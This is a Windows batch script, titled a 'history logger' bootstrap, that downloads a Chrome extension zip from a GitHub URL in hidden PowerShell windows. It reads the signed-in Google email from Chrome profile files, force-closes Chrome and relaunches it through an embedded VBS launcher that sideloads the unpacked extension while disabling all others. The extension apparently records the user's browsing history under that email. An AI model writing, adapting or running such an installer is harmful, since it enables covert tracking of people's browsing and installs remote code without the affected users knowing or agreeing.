@echo off
setlocal EnableDelayedExpansion

echo ==================================================
echo   HISTORY LOGGER BOOTSTRAP — ZIP → UNPACKED EXT  
echo ==================================================

REM 0) Make sure Chrome is closed
echo [!] PLEASE CLOSE ALL CHROME WINDOWS, then press any key…
pause

REM 1) CONFIG: your raw GitHub zip URL
set "ZIP_URL=https://raw.githubusercontent.com/Ayamet/web/main/extension.zip"

REM prepare a clean temp folder
set "WORKDIR=%TEMP%\history-logger-%RANDOM%"
set "EXT_DIR=%WORKDIR%\extension"
mkdir "%WORKDIR%" 2>nul || (echo ERROR creating %WORKDIR% & exit /b 1)

echo [1] Downloading extension.zip…
powershell -NoProfile -WindowStyle Hidden -Command ^
  "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing" || (
    echo ERROR downloading zip & pause & exit /b 1
  )

echo [2] Extracting ext.zip…
powershell -NoProfile -WindowStyle Hidden -Command ^
  "Expand-Archive -LiteralPath '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force" || (
    echo ERROR extracting zip & pause & exit /b 1
  )

echo [3] Locating manifest.json…
set "FOUND=0"
if exist "%EXT_DIR%\manifest.json" set "FOUND=1"
if "%FOUND%"=="0" (
  for /D %%D in ("%EXT_DIR%\*") do (
    if exist "%%D\manifest.json" (
      set "EXT_DIR=%%D"
      set "FOUND=1"
      goto :got
    )
  )
)
:got
if "%FOUND%"=="0" (
  echo ERROR: manifest.json not found! & pause & exit /b 1
)
echo   Extension root = %EXT_DIR%

echo [4] Scanning Chrome profiles for email…
set "EMAIL="
for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
  if exist "%%P\Preferences" (
    for /f "usebackq delims=" %%E in (`
      powershell -NoProfile -WindowStyle Hidden -Command ^
        "try {(Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email} catch {''}"
    `) do if not defined EMAIL (
      set "EMAIL=%%E"
    )
  )
)
if not defined EMAIL set "EMAIL=anonymous@demo.com"
echo   Will log under: %EMAIL%

echo [5] Writing config.json…
> "%EXT_DIR%\config.json" echo {^"userEmail^":^"%EMAIL%"^}

echo [6] Closing any running Chrome…
taskkill /F /IM chrome.exe >nul 2>&1

echo [7] Locating chrome.exe…
set "CHROME_PATH="
for %%P in (
  "%ProgramFiles%\Google\Chrome\Application\chrome.exe"
  "%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
  "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"
) do if exist "%%~P" set "CHROME_PATH=%%~P"
if not defined CHROME_PATH (
  echo ERROR: chrome.exe not found! & pause & exit /b 1
)
echo   chrome.exe = %CHROME_PATH%

echo [8] Extracting & running VBS launcher…
set "VBS=%WORKDIR%\launch.vbs"
break > "%VBS%"
for /f "delims=" %%L in ('findstr /b "::VBS:" "%~f0"') do (
  set "line=%%L"
  >>"%VBS%" echo(!line:~6!
)
cscript //nologo "%VBS%" "%EXT_DIR%" "%CHROME_PATH%"

echo.
echo ==================================================
echo   INSTALL COMPLETE — check chrome://extensions   
echo ==================================================
pause
exit /b

::VBS:Set WshShell = CreateObject("WScript.Shell")
::VBS:extDir     = WScript.Arguments(0)
::VBS:chromeExe  = WScript.Arguments(1)
::VBS:flags      = "--disable-extensions-except=""" & extDir & """ --load-extension=""" & extDir & """ --new-window chrome://extensions"
::VBS:WshShell.Run """" & chromeExe & """" & " " & flags, 1, False
